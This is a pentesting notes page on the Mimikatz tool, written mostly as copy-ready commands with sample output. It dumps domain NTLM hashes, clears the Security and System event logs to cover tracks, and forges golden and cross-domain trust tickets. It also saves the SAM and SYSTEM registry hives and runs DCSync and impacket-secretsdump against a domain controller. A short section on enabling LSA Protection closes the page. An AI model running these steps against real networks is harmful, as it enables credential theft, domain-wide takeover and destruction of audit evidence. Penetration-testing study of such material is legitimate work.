---
title: Mimikatz
source_url: https://notes.incendium.rocks/pentesting-notes/windows-pentesting/tools/mimikatz
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: windows
---
Benjamin Delpy originally created Mimikatz as a proof of concept to show Microsoft that its authentication protocols were vulnerable to an attack. Instead, he inadvertently created one of the most widely used and downloaded threat actor tools of the past 20 years.

Dubbed “one of the world's most powerful password stealers” by [Wired.com](https://www.wired.com/story/how-mimikatz-became-go-to-hacker-tool/),  any IT professional tasked with protecting Windows networks needs to pay close attention to the latest Mimikatz developments to understand how hackers will manipulate the tool to infiltrate networks.

It's now well known to extract plaintexts passwords, hash, PIN code and kerberos tickets from memory. **`mimikatz`** can also perform pass-the-hash, pass-the-ticket or build *Golden tickets*

***

[*Download mimikatz*](https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20220919)

## **Dump Hashes w/ mimikatz**

First run privilege::debug to ensure we are running mimikatz as an administrator

```bash
controller\administrator@DOMAIN-CONTROLL C:\Users\Administrator\Downloads>.\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 May  2 2020 16:23:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

**mimikatz # privilege::debug
Privilege '20' OK**

mimikatz #
```

20 means that we are running mimikatz as an administrator. If you don't run mimikatz as an administrator, mimikatz will not run properly.

Next we can dump **NTLM** hashes with lsadump::lsa /patch

```bash
mimikatz # lsadump::lsa /patch
Domain : CONTROLLER / S-1-5-21-849420856-2351964222-986696166

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : 2777b7fec870e04dda00cd7260f7bee6

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : 5508500012cc005cf7082a9a89ebdfdf

RID  : 0000044f (1103)
User : Machine1
LM   :
NTLM : 64f12cddaa88057e06a81b54e73b949b

RID  : 00000451 (1105)
User : Admin2
LM   :
NTLM : 2b576acbe6bcfda7294d6bd18041b8fe

RID  : 00000452 (1106)
User : Machine2
LM   :
NTLM : c39f2beb3d2ec06a62cb887fb391dee0

RID  : 00000453 (1107)
User : SQLService
LM   :
NTLM : f4ab68f27303bcb4024650d8fc5f973a

RID  : 00000454 (1108)
User : POST
LM   :
NTLM : c4b0e1b10c7ce2c4723b4e2407ef81a2

RID  : 00000457 (1111)
User : sshd
LM   :
NTLM : 2777b7fec870e04dda00cd7260f7bee6

RID  : 000003e8 (1000)
User : DOMAIN-CONTROLL$
LM   :
NTLM : b3c29e791c3a763beffb4dc7fa883ced

RID  : 00000455 (1109)
User : DESKTOP-2$
LM   :
NTLM : 3c2d4759eb9884d7a935fe71a8e0f54c

RID  : 00000456 (1110)
User : DESKTOP-1$
LM   :
NTLM : 7d33346eeb11a4f12a6c201faaa0d89a
```

⚠️ Starting with Windows 8.1 and Windows Server 2012 R2, the LM hash and “clear-text” password are no longer in memory.

## Clearing event log w/mimikatz

`event::clear` clears a specified event log.

```bash
mimikatz # **event::clear**
Using "Security" event log :
- 3996 event(s)
- Cleared !
- 0 event(s)
```

* Mimikatz clears de Security log as default

We can use /log: to specify a specific log to clear:

```bash
mimikatz # event::clear **/log:System**
Using "System" event log :
- 818 event(s)
- Cleared !
- 0 event(s)
```

***

## Golden tickets w/mimikatz

A **Golden Ticket** is a TGT using the **KRBTGT** NTLM password hash to encrypt and sign. A Golden Ticket (GT) can be created to **impersonate** any user (real or imagined) in the domain as a member of any group in the domain (providing a virtually unlimited amount of rights) to any and every resource in the domain.

1. **Dump the krbtgt Hash**

```bash
lsadump::lsa /inject /name:krbtgt
```

This dumps the hash and security identifier of the Kerberos Ticket Granting Ticket account allowing you to create a golden ticket

Take note of what is outlined in red you'll need it to create the golden ticket

1. The SID
2. The user
3. The NTL Hash

```bash
mimikatz # lsadump::lsa /inject /name:krbtgt
Domain : CONTROLLER / **S-1-5-21-849420856-2351964222-986696166**

RID  : 000001f6 (502)
User : **krbtgt**

 * Primary
    NTLM : **5508500012cc005cf7082a9a89ebdfdf**
```

#### Create the golden ticket

```bash
kerberos::golden /user: /domain: /sid: /krbtgt: /id:
```

Example:

```
kerberos::golden /user:krbtgt /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500
```

```bash
mimikatz # kerberos::golden /user:krbtgt /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500
User      : krbtgt
Domain    : controller.local (CONTROLLER)
SID       : S-1-5-21-849420856-2351964222-986696166
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 5508500012cc005cf7082a9a89ebdfdf - rc4_hmac_nt
Lifetime  : 10/21/2022 2:24:50 AM ; 10/18/2032 2:24:50 AM ; 10/18/2032 2:24:50 AM
-> Ticket : ticket.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !
```

#### **Use the Golden Ticket to access other machine**

open a new command prompt with elevated privileges to all machines:

```bash
misc::cmd
```

Access other Machines! - You will now have another command prompt with access to all other machines on the network

## Cross domain forged golden trust tickets

From a child domain you can get a golden ticket for the parent domain if the child domain is trusted by the parent.

### Enumerating

```
Get-NetForest [-Forest megacorp.local]
Get-Forest [-Forest megacorp.local]
```

Need PowerView\.ps1 for this:

```
Get-NetForestDomain [-Forest megacorp.local]
Get-ForestDomain [-Forest megacorp.local]
```

### Create cross-trust golden ticket

For creating a cross-trust golden ticket we'll need:

* NT hash of krbtgt from child domain
* Domain sid of child domain
* Domain sid of parent domain
* SPN child domain
* SPN parent domain

Get sid of child domain and parent domain using mimikatz:

```
.\mimikatz.exe "lsadump::trust /patch" exit
```

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FSx1ipXnpbNbwPMwm5EsT%2Fimage.png?alt=media&amp;token=708fa78d-5d2f-41d3-a965-2a5805d908f9" alt=""><figcaption></figcaption></figure>

&#x20;To get NT hash of krbtgt we can dump SAM and SYSTEM and use mimikatz:

```
reg save HKLM\SAM "C:\Windows\Temp\sam.save"
reg save HKLM\SECURITY "C:\Windows\Temp\security.save"
reg save HKLM\SYSTEM "C:\Windows\Temp\system.save"
```

Next, we use mimikatz with lsadump:

```
.\mimikatz.exe "lsadump::sam /sam:'C:\path\to\sam.save' /system:'C:\path\to\system.save'" exit
```

We can use mimikatz to create a golden ticket and store it in memory:

```
kerberos::golden /domain:dev.admin.offshore.com /sid:S-1-5-21-1216317506-3509444512-4230741538 /sids:S-1-5-21-1216317506-3509444512-4230741538-519 /rc4:<rc-4> /admin:administrator /ptt
```

### With impacket

Now that we have the NT hash of krbtgt, we can create the ticket using impacket-ticketer:

```
impacket-ticketer -nthash <nt-hash-krbtgt> -domain-sid S-1-5-21-3056178012-3972705859-491075245 -domain internal.zsm.local -extra-sid S-1-5-21-2734290894-461713716-141835443-519 -spn krbtgt/zsm.local incendium
```

And export it in cache:

```
export KRB5CCNAME=incendium.ccache
```

Next use impacket-getST to get the ticket for the parent domain:

```
impacket-getST -k -no-pass -spn cifs/zph-svrdc01.zsm.local zsm.local/incendium@zsm.local -dc-ip 192.168.210.10
```

Now export this ticket in cache and use with impacket-secretsdump for example:

```
impacket-secretsdump -k -no-pass incendium@zph-svrdc01.zsm.local -target-ip 192.168.210.10 -dc-ip 192.168.210.10
```

## DCSync attack

We can also use mimikatz to do a dcsync attack:

<pre><code><strong># Get all
</strong><strong>.\mimikatz.exe "lsadump::dcsync /domain:ADMIN.OFFSHORE.COM /all /csv" exit
</strong><strong>
</strong><strong># Specific user
</strong><strong>.\mimikatz.exe "lsadump::dcsync /user:admin\administrator /domain:admin.offshore.com" exit
</strong></code></pre>

## Protection against mimikatz

Windows Server 2012 R2 and Windows 8.1 includes a new feature called **LSA Protection** which involves enabling [LSASS as a protected process on Windows Server 2012 R2](https://technet.microsoft.com/en-us/library/dn408187.aspx) (Mimikatz can bypass with a driver, but that should make some noise in the event logs):

*The LSA, which includes the Local Security Authority Server Service (LSASS) process, validates users for local and remote sign-ins and enforces local security policies. The Windows 8.1 operating system provides additional protection for the LSA to prevent reading memory and code injection by non-protected processes. This provides added security for the credentials that the LSA stores and manages.*

**Enabling LSA protection:**

1. Open the Registry Editor (RegEdit.exe), and navigate to the registry key that is located at: HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa and Set the value of the registry key to: “RunAsPPL”=dword:00000001.&#x20;
2. Create a new GPO and browse to Computer Configuration, Preferences, Windows Settings. Right-click Registry, point to New, and then click Registry Item. The New Registry Properties dialog box appears. In the Hive list, click HKEY\_LOCAL\_MACHINE. In the Key Path list, browse to SYSTEM\CurrentControlSet\Control\Lsa. In the Value name box, type RunAsPPL. In the Value type box, click the REG\_DWORD. In the Value data box, type 00000001.Click OK.

**LSA Protection prevents non-protected processes from interacting with LSASS**. Mimikatz can still bypass this with a driver (“!+”).

<https://www.youtube.com/watch?v=RGQuXAABBoo>

Now when we add these policies, we can see the results with mimikatz:

```bash
mimikatz # lsadump::cache
Domain : DOMAIN-CONTROLL
SysKey : 7fe79e8f487dfca5b016725d1565c7bb
**ERROR kuhl_m_lsadump_secretsOrCache ; kull_m_registry_RegOpenKeyEx** (SECURITY) (0x00000005)

mimikatz #
```
